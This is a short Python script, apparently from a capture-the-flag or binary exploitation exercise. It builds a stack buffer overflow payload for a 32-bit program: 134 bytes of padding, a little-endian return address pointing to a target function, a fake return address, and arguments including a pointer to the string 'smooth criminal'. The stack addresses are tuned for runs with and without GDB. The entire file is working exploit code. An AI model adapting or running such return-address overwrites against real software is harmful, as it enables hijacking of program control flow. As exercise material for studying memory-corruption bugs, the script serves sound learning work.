#!/usr/bin/env python3

import sys


oflow = b'A' * 134
# 080488d7
faddr = b'\xd7\x88\x04\x08'
fakeret = b'\xef\xbe\xad\xde'
# GDB: 0xffffcf9c, native 0xffffd01c
#stack_addr = 0xffffcf9c
stack_addr = 0xffffd01c
# string + 0x10
string_addr = stack_addr + 0x10
farg = [ b'\x02\x00\x00\x00', string_addr.to_bytes(4, byteorder='little') ]
string = b"smooth criminal\0"

exploit = bytearray(oflow + faddr + fakeret)

for arg in farg:
    exploit.extend(arg)

exploit.extend(string)
exploit.extend(b'\n')

sys.stdout.buffer.write(exploit)
